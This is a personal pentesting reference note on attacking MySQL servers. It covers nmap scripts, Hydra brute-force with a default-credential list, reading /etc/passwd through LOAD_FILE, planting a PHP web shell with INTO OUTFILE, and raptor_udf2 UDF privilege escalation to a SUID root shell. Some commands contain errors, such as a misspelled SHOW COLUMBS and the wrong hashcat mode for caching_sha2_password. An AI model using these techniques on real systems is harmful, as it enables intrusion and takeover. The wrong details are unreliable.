---
created: 23-01-2026
tags:
  - net_hack
  - network_services
---
## MySQL

 >**[MySQL](https://en.wikipedia.org/wiki/MySQL)** is an open-source relational database management system (RDBMS) that uses SQL (Structured Query Language) to manage and manipulate data. 

- MySQL is the world's most popular open-source RDBMS.
- By default, MySQL servers listen on **TCP port `3306`**.  

>[!note] In MySQL, a **database** and **schema** are synonymous and are used interchangeably.

>[!interesting]+ MariaDB
>[MariaDB](https://en.wikipedia.org/wiki/MariaDB) is a fork of the original MySQL code. 
### Default MySQL databases

MySQL defines several default databases that store its metadata and system information:

- **`mysql`**
	- Stores system-level information, such as user accounts, privileges, permissions, password hashes, server configuration, and stored procedures/functions.
	- Requires elevated privileges for direct access.

- **`information_schema`**
	- Provides read-only access to metadata about all databases, tables, columns, and other database objects.
	- The database itself is accessible to **all users** without special privileges, but you can see metadata only for those objects you have permissions to access.
	- Available from MySQL 5.0+; required by the SQL standard.

- **`performance_schema`**
	- In-memory tables that track server performance metrics, resource usage, query execution statistics, and instrumentation data; used for low-level performance monitoring. 

- **`sys`**
	- A set of views and stored procedures that provide simplified views of the `performance_schema` and `information_schema` data.
	- Aggregates complex performance and status data into human-readable and user-friendly formats; useful for quick health checks and diagnostics.
	- Available from MySQL 5.7+.
### Authentication

MySQL supports [multiple authentication methods](https://dev.mysql.com/doc/dev/mysql-server/8.4.6/page_protocol_connection_phase_authentication_methods.html), including:

- `mysql_native_password` (default before MySQL 8.0)
	- Stores usernames and SHA-1-hashed passwords in `mysql.user` table.
	- SHA-1 is cryptographically broken and vulnerable to rainbow table attacks.
	- Still common in legacy systems.

- `caching_sha2_password` (default in MySQL 8.0+)
	- Stores passwords hashed with SHA-256 algorithm.
	- More resistant to brute-force attacks (but still quite easy to crack having enough time and computational resources).

- **`auth_socket`**
	- Unix socket authentication (local connections only).
	- No password required for local connections.
	- If an attacker gains shell access to the database server, they can connect as any user without a password.

- `pam_authentication`
	- Integrates with Linux PAM (Pluggable Authentication Modules).
	- Delegates authentication to system-level mechanisms.

Other supported authentication methods include LDAP, Kerberos, and FIDO (FIDO2/WebAuthn).

>[!example]+ Example: User creation in MySQL
>```bash
>CREATE USER 'user'@'localhost' IDENTIFIED BY 'password';
>``` 

## Reconnaissance

### Port scanning

- Run default scripts against MySQL port on the target:

```bash
nmap -p 3306 -sV -sC <target_ip>
```

- Scan all ports on the target and run MySQL scripts if MySQL is detected on one of the ports:

```bash
nmap -p- -sV --script mysql-* <target_ip>
```

>[!note] Although MySQL's default port is `3306`, it can run on any port.

### Nmap MySQL scripts

| Script                                                                              | Description                                                                                                                                                                                                                              | Categories                  | Authentication required |
| ----------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------- | ----------------------- |
| [`mysql-empty-password`](https://nmap.org/nsedoc/scripts/mysql-empty-password.html) | Checks for empty passwords for `root` or `anonymous`.<br>No authentication required.                                                                                                                                                     | `intrusive`, `auth`         | ❌                       |
| [`mysql-brute`](https://nmap.org/nsedoc/scripts/mysql-brute.html)                   | Performs credential brute-force; uses `userdb` and `passdb` wordlists.<br>No authentication required.                                                                                                                                    | `intrusive`, `brute`        | ❌                       |
| [`mysql-enum`](https://nmap.org/nsedoc/scripts/mysql-enum.html)                     | Enumerates valid users on MySQL server.<br>No authentication required.                                                                                                                                                                   | `intrusive`, `brute`        | ❌                       |
| [`mysql-databases`](https://nmap.org/nsedoc/scripts/mysql-databases.html)           | Attempts to list all databases on a MySQL server.<br>Requires valid MySQL credentials (`SHOW DATABASES` privileges).                                                                                                                     | `discovery`, `intrusive`    | ✅                       |
| [`mysql-dump-hashes`](https://nmap.org/nsedoc/scripts/mysql-dump-hashes.html)       | Dumps the password hashes from an MySQL server (in a format suitable for cracking with tools like JohnTheRipper). <br>`root` privileges are required.<br>Requires valid MySQL credentials; `root` privileges (`SELECT` on `mysql.user`). | `auth`, `discovery`, `safe` | ✅                       |
| [`mysql-variables`](https://nmap.org/nsedoc/scripts/mysql-variables.html)           | Attempts to show all variables on a MySQL server.<br>Requires valid MySQL credentials (`SHOW DATABASES` privileges).                                                                                                                     | `discovery`, `intrusive`    | ✅                       |
| [`mysql-query`](https://nmap.org/nsedoc/scripts/mysql-query.html)                   | Runs a query against a MySQL database and returns the results as a table.<br>Requires valid MySQL credentials.                                                                                                                           | `auth`, `discovery`, `safe` | ✅                       |
**No authentication required:**

- `mysql-empty-password`: Check for empty `root` password:

```bash
nmap -p 3306 --script mysql-empty-password <target_ip_address>
```

- `mysql-enum`: Enumerate valid MySQL users:

```bash
nmap -p 3306 --script mysql-enum <target_ip_address>
```

- `mysql-brute`: Check for weak passwords:

```bash
nmap -p 3306 --script mysql-brute <target_ip_address>
```

```bash
# custom wordlist
nmap -p 3306 --script mysql-brute \
--script-args userdb=users.txt,passdb=passes.txt <target_ip_address>
```

**Authentication required:**

- `mysql-databases`: Attempts to list databases on a MySQL server:

```bash
nmap -p 3306 --script mysql-databases --script-args mysqluser=root,mysqlpass=password <target_ip>
```

- `mysql-variables`: Inspect MySQL configuration:

```bash
nmap -p 3306 --script mysql-variables --script-args mysqluser=root,mysqlpass=password <target_ip>
```

- `mysql-dump-hashes`: Dump password hashes (requires authentication and high privileges, usually `root`):

```bash
nmap -p 3306 --script mysql-dump-hashes --script-args='username=root,password=password' <target_ip>
```

- `mysql-query`: Execute an arbitrary query on the server:

```bash
nmap -p 3306 --script mysql-query \
--script-args mysqluser=root,mysqlpass=password,query="SELECT user,host FROM mysql.user" <target_ip>
```

## Connecting to MySQL

### `mysql` client

- To connect to a MySQL database from Linux, use the `mysql` command:

```bash
mysql -h <target_ip_address> -u <username> -p<password> 
```

>[!note] There shouldn't be a space between `-p` and the password.

- If you don't specify the host, `mysql` will fall back to the default `localhost`.

- For an interactive password prompt, leave `<password>` empty:

```bash
mysql -h <target_ip_address> -u <username> -p
```

>[!note] The default port is `3306`.

- Specify a custom port:

```bash
mysql -h <target_ip_address> -P <port> -u <username> -p<password>
```

- Connect and execute a query

```bash
mysql -u username -p -e "SELECT @@version;"
```

- Connect without selecting a database:

```bash
mysql -u username -h target.com -p --skip-database
```

- Check if TLS is enabled:

```bash
mysql -h <target_ip_address> -u <username> -p --ssl-mode=REQUIRED
```

- Attempt a Unix socket connection (local only):

```bash
mysql -u <username> -S /var/run/mysqld/mysqld.sock
```
### Python

- To connect to a MySQL database using Python, you can use the `mysql.connector` module:

```Python
import mysql.connector

conn = mysql.connector.connect(
    host='192.168.1.11',
    user='root',
    password='password',
    database='mysql'
)
cursor = conn.cursor()
cursor.execute("SELECT @@version")
print(cursor.fetchone())
conn.close()
```

### PHP

```PHP
<?php
$mysqli = new mysqli('192.168.1.11', 'root', 'password', 'mysql');
if ($mysqli->connect_error) {
    die("Connection failed: " . $mysqli->connect_error);
}
$result = $mysqli->query("SELECT @@version");
echo $result->fetch_row()[0];
$mysqli->close();
?>
```

### Java 

```Java
import java.sql.*;

public class MySQLConnect {
    public static void main(String[] args) {
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
            Connection conn = DriverManager.getConnection(
                "jdbc:mysql://192.168.1.100:3306/mysql",
                "root", "password"
            );
            Statement stmt = conn.createStatement();
            ResultSet rs = stmt.executeQuery("SELECT @@version");
            if (rs.next()) {
                System.out.println(rs.getString(1));
            }
            conn.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
## Enumeration
### Version detection

- MySQL version:

```SQL
SELECT @@version;
```

```SQL
SELECT VERSION();
```

```SQL
SELECT @@global.version;
```

>[!example]
>```SQL
>SELECT @@version;
>```
>```
>10.11.11-MariaDB-0+deb12u1
>```

- [InnoDB](https://en.wikipedia.org/wiki/InnoDB) storage engine version:

```
@@innodb_version;
```

- Server software information:

```SQL
SELECT @@version_compile_os;
```

```SQL
SELECT @@version_compile_machine;
```

>[!example]+
> ```SQL
> SELECT @@version_compile_os;
> ```
> 
> ```
> debian-linux-gnu
> ```

>[!example]+
> ```SQL
> SELECT @@version_compile_machine;
> ```
> 
> ```
> x86_64
> ```

- Search for version variables:

```SQL
SHOW VARIABLES LIKE "%version%";
```

- Query to output multiple variables at once:

```SQL
SELECT 
    @@version AS 'MySQL Version',
    @@version_comment AS 'Version Comment',
    @@version_compile_os AS 'OS',
    @@version_compile_machine AS 'Architecture',
    @@innodb_version AS 'InnoDB Version',
    @@character_set_server AS 'Character Set',
    @@collation_server AS 'Collation';
```
### Databases

- List databases ([`SHOW DATABASES`](https://dev.mysql.com/doc/refman/8.4/en/show-databases.html)): 

```SQL
SHOW DATABASES;
```

```SQL
SELECT schema_name FROM information_schema.SCHEMATA;
```

- Show current database:

```SQL
SELECT DATABASE();
```

- Switch database:

```SQL
USE users;
```

- Database size:

```SQL
SELECT
	table_schema AS 'Database',
	ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS 'Size (MB)'
FROM information_schema.TABLES
GROUP BY table_schema;
```

- Count tables per database:

```SQL
SELECT table_schema, COUNT(*) FROM information_schema.tables GROUP BY table_schema;
```
### Tables and columns

- List tables in the current database:

```SQL
SHOW TABLES;
```

```SQL
SELECT table_name FROM information_schema.TABLES WHERE table_schema=DATABASE()' 
```

- Show table structure:

```SQL
DESCRIBE <table_name>;
```

- List columns in a specific table:

```SQL
SHOW COLUMBS FROM table_name;
```

```SQL
SELECT column_name, data_type FROM information_schema.COLUMNS WHERE table_name='users';
```

- Find sensitive columns:

```SQL
SELECT table_name, column_name FROM information_schema.COLUMNS  
WHERE column_name LIKE '%password%'
	OR column_name LIKE '%pass%'
	OR column_name LIKE '%pwd%'
	OR column_name LIKE '%secret%'
	OR column_name LIKE '%token%'
```


- Count rows in tables:

```SQL
SELECT table_name, table_rows FROM information_schema.TABLES WHERE table_schema = DATABASE();
```
### Users

- Get the current MySQL user:

```SQL
SELECT USER();
```

```SQL
SELECT CURRENT_USER();
```

- List MySQL users:

```SQL
SELECT user,host FROM mysql.user;
```

### Privileges

- Check user privileges:


```SQL
SHOW GRANTS;
```

```SQL
SELECT grantee, privilege_type FROM information_schema.user_privileges
```


- Show privileges for a specific user:

```SQL
SHOW GRANTS FOR 'username'@'host';
```

```SQL
SELECT * FROM information_schema.user_privileges WHERE grantee LIKE '%username%';
```

```SQL
SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee="'username'@'host'"
```

>[!note] `Y` in the response means `YES`.

- List users with the `FILE` privilege:

```SQL
SELECT user, host FROM mysql.user WHERE File_priv = 'Y';
```

- List users with the `SUPER` privilege:

```SQL
SELECT user, host FROM mysql.user WHERE Super_priv = 'Y';
```

- Check if the user has superuser privileges:

```SQL
SELECT super_priv FROM mysql.user WHERE user="username"
```

- Check for dangerous privileges:

```SQL
SELECT user, host, Select_priv, Insert_priv, Update_priv, Delete_priv,  
Create_priv, Drop_priv, File_priv, Super_priv  
FROM mysql.user;
```

### Configuration and system variables

- List variables:

```SQL
SHOW VARIABLES;
```

- File operations directory (where MySQL can read files using `LOAD DATA INFILE` or write files using `SELECT ... INTO OUTFILE`):

```SQL
SHOW VARIABLES LIKE 'secure_file_priv';
```

- Plugin directory (where MySQL can load functions from):

```SQL
SHOW VARIABLES LIKE 'plugin_dir';
```

- Data directory (where MySQL stores databases, tables, log files, and other critical server data):

```bash
SHOW VARIABLES LIKE 'datadir';
```

- Base directory (path to the MySQL installation directory):

```SQL
SHOW VARIABLES LIKE 'basedir';
```

- Check if `local_infile` is enabled (controls the ability to use `LOAD DATA LOCAL INFILE` statements):

```SQL
SHOW VARIABLES LIKE 'local_infile';
```

- Process list (information about the threads currently executing within the MySQL server):

```SQL
SHOW PROCESSLIST;
```

```SQL
SELECT * FROM information_schema.PROCESSLIST;
```
## Credential brute-force 

Dictionary attacks with Hydra:

- Password brute-force for one user (`root`):

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<target_ip_address>
```

- Password brute-force for multiple users:

```bash
hydra -L users.txt -P passwords.txt mysql://<target_ip_address>
```

- Specify a custom port:

```bash
hydra -l root -P passwords.txt -s 3307 mysql://<target_ip_address>
```

- Specify the number of threads to use:

```bash
hydra -l root -P passwords.txt -t 4 mysql://<target_ip_address>
```

- Common default credentials to try (see [`SecLists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt`](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt)):

```bash
root:mysql
root:root
root:chippc
admin:admin
root:
root:nagiosxi
root:usbw
cloudera:cloudera
root:cloudera
root:moves
moves:moves
root:testpw
root:p@ck3tf3nc3
mcUser:medocheck123
root:mktt
root:123
dbuser:123
asteriskuser:amp109
asteriskuser:eLaStIx.asteriskuser.2oo7
root:raspberry
root:openauditrootuserpassword
root:vagrant
root:123qweASD#
```

## File system operations
### Reading local files

- Read content of a local file into the database:

```SQL
SELECT * LOAD_FILE('/etc/passwd')
```

>[!important] To perform file operations, your user must have the `FILE` privilege.

- The file must be located on the **same host where MySQL server is running** (only local files), and the **full path** must be specified.
- The file must be readable by the MySQL process user (or by all users).
- File location must satisfy the `secure_file_priv` restriction.
- File size must be less than `max_allowed_packet`.

>[!note]+ `secure_file_priv`
>- Check the `secure_file_priv` value:
>```SQL
>SELECT @@secure_file_priv;
>```
>```SQL
> SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
> ```
>`secure_file_priv` values:
>- `NULL`: File operations are completely disabled (most secure, default in MySQL 8.0+).
>	- In this case, `LOAD DATA INFILE` will fail with: `The MySQL server is running with the --secure-file-priv option so it cannot execute this statement`.
>- `''` (empty string): No restrictions — any file the MySQL process can read is accessible (insecure; default in MySQL 5.5 and earlier).
>- Specific directory path: Files can be read only from the specified directory. 

>[!note]+ `max_allowed_packet`
>- Check `max_allowed_packet`:
>```SQL
>SHOW VARIABLES LIKE '%max_allowed_packet%';
>```
 The file contents is returned as a string value in query results. If the file does not exist or cannot be read because one of the preceding conditions is not satisfied, the function returns `NULL`.

### Writing files

In MySQL, you can write files using the [`SELECT ... INTO OUTFILE`](https://dev.mysql.com/doc/refman/8.4/en/select-into.html) statement. It writes the selected rows to a file.

- Write a basic PHP web shell:

```SQL
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

```SQL
SELECT '<?php system($_GET["cmd"]); ?>' INTO DUMPFILE '/var/www/html/shell.php';
```

- Dump content of a table into a file:

```SQL
SELECT * FROM users INTO OUTFILE '/tmp/file.txt'
```


>[!important] To perform file operations, your user must have the `FILE` privilege.

- The file is created on the server host.
- The MySQL server process must have **write permissions** on the target directory.
- The MySQL service account (typically `mysql` user on Linux or `SYSTEM` on Windows) determines write access.
- Files created by MySQL are owned by the MySQL process user with umask `0640`.

>[!warning] Writing files is typically strictly reserved for privileged users. 


- Common web roots to try:
	- `/var/www/html/`
	- `/var/www/html/uploads/`
	- `/var/www/`
	- `/usr/share/nginx/html/`
	- `/home/username/public_html/`

- If you were able to upload a file to a web root, you might be able to access it from the website, e.g., via `http://target_ip_address/shell.php?cmd=whoami`.

## Command execution

- Spawn a shell:

```bash
/!sh
```

- Execute a command:

```SQL
SELECT sys_exec('id');
```

## Privilege escalation through User-Defined Functions (UDF)

### UDFs

>A **User-Defined Function (UDF)** in MySQL is a **custom function implemented in native code (C/C++)**, compiled as a **shared library** (`.so` on Linux, `.dll` on Windows), and **loaded into the MySQL server process** at runtime.

- UDFs are **not SQL functions** — they are **native code executed inside `mysqld`**.
- A UDF runs **in-process**, not as a child process.
- If a UDF crashes, MySQL crashes. 

A developer might create a UDF for custom cryptographic functions or specialized math and analytics — and use it just like any built-in MySQL functoin (e.g., `ABS()` or `CONCAT()`). But from an attacker's perspective, UDFs is literally injecting arbitrary C code execution into the database engine.



### Privilege escalation via UDFs

>[!important]+ On MySQL versions and UDF support
> - MySQL UDFs were introduced in MySQL 4.0, and they still exist in MySQL 8.0. However, UDF exploitation is heavily restricted in 8.0+.
> - Most public UDF exploits (including raptor) assume **MySQL ≤ 5.7**.
> 
> In newer versions, the `SUPER` privilege was split, and stricter checks on plugin loading were introduced. That's why exploitation breaks in newer versions — but it doesn't mean it's impossible.

Conditions for UDF exploitation:

- **MySQL ≤ 5.7** (or insecure 8.0 config). Check MySQL version:

```SQL
SELECT @@version;
```

- Your MySQL user has the **`SUPER` privilege**. Check the current user's privileges:

```SQL
SHOW GRANTS;
```

```SQL
SELECT super_priv FROM mysql.user WHERE user = SUBSTRING_INDEX(CURRENT_USER(),'@',1);
```

- Your user has **write access to the directory defined in the `@@plugin_dir` variable** (MySQL UDFs can be loaded only from libraries located there; commonly set to `/usr/lib/mysql/plugin` or `/usr/lib64/mysql/plugin`). Check `@@plugin_dir`:

```SQL
SELECT @@plugin_dir;
```

If you already have established a foothold on the target machine, you can directly put a `.so` file into the MySQL plugin directory. Otherwise, to create a library from within the MySQL process, the `@@secure_file_priv` variable must be either empty or set to the plugin directory:

```SQL
SHOW VARIABLES LIKE 'secure_file_priv';
```

If the above conditions are met, you can achieve command execution on the target server. For this purpose, you can use a popular [`raptor_udf2` exploit](https://www.exploit-db.com/exploits/1518). It provides the `do_system(command)` function that, internally, calls `system()` from libc and therefore turns your SQL string into an OS shell command.  

>[!note] You can think of UDFs as of SQL wrappers around C code, and the `raptor_udf2` exploit is of an SQL wrapper around `system()`.

1. Link and compile the library:

```bash
gcc -g -c raptor_udf2.c -fPIC
```

```bash
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

2. Create a table to store raw binary data for the UDF:

```SQL
CREATE TABLE foo(line BLOB);
```

3. Load the `.so` library from the disk into the table you've created:

```SQL
INSERT INTO foo VALUES (LOAD_FILE('/home/user/tools/mysql-udf/raptor_udf2.so'));
```

MySQL reads the binary `.so` file from disk and stores it as raw bytes inside the table.

4. Copy the `.so` library into the plugin directory:

```SQL
SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
```

5. Create a UDF:

```SQL
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
```

This loads `raptor_udf2.so` into memory, looks for `do_system()` inside the code, and registers it as a callable SQL function.

6. List UDFs to check your function is registered:

```SQL
SELECT * FROM mysql.func;
```

7. Execute OS commands:

```SQL
SELECT do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

>[!note]+ **UDFs execute native code with the same OS privileges as the MySQL server.**
> - If MySQL runs as `mysql` -> UDF runs as `mysql`.
> - If MySQL runs as `root` (bad but seen) -> UDF runs as root.
## Cracking password hashes

- Dumping password hashes (requires MySQL `root`):

```SQK
SELECT user, host, authentication_string FROM mysql.user;
```

- `mysql_native_password` (SHA-1):

```
root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
```

```bash
hashcat -m 300 hashes.txt /usr/share/wordlists/rockyou.txt
```

- `caching_sha2_password`:

```
root:$A$005$THISISACOMPLEXSALT$... (truncated)
```

```bash
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
```

## References and further reading


- [`MySQL Injection — Payloads All The Things`](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/MySQL%20Injection/)
- [`MySQL — hackviser`](https://hackviser.com/tactics/pentesting/services/mysql)


- [`MySQL LOAD_FILE() function — w3resource`](https://www.w3resource.com/mysql/string-functions/mysql-load_file-function.php)

- [`LOAD_FILE() — MariaDB`](https://mariadb.com/docs/server/reference/sql-functions/string-functions/load_file)

- [`Chapter 6 Adding Functions to MySQL — MySQL Documentation`](https://dev.mysql.com/doc/extending-mysql/8.0/en/adding-functions.html)


- [`MySQL User Defined Functions — Linux Privilege Escalation — Juggernaut Pentesting Academy`](https://juggernaut-sec.com/mysql-user-defined-functions/)

## Drafts



- There's also a [`LOAD DATA`](https://dev.mysql.com/doc/refman/8.4/en/load-data.html) statement in MySQL. It can be used to import file contents into database table rows, where you can read it:

```SQL
LOAD DATA INFILE '/etc/passwd' iNTO TABLE table_name
```

- The database user you're running as must have the `FILE` privilege.
- MySQL process user (typically `mysql`) must have read permissions on the file.
- File location must satisfy `secure_file_priv` restriction.

>[!important] `LOAD_FILE()` returns file data in query results, while `LOAD DATA` populates table rows with file contents.


>[!tip]+ 
> [`FROM_BASE64()`](https://dev.mysql.com/doc/refman/8.4/en/string-functions.html#function_from-base64) takes a Base64-encoded string and returns the recorded results as a binary string.
> [`TO_BASE64()`](https://dev.mysql.com/doc/refman/8.4/en/string-functions.html#function_to-base64) is a reverse operation: it takes a string to Base64-encoded form and returns the result.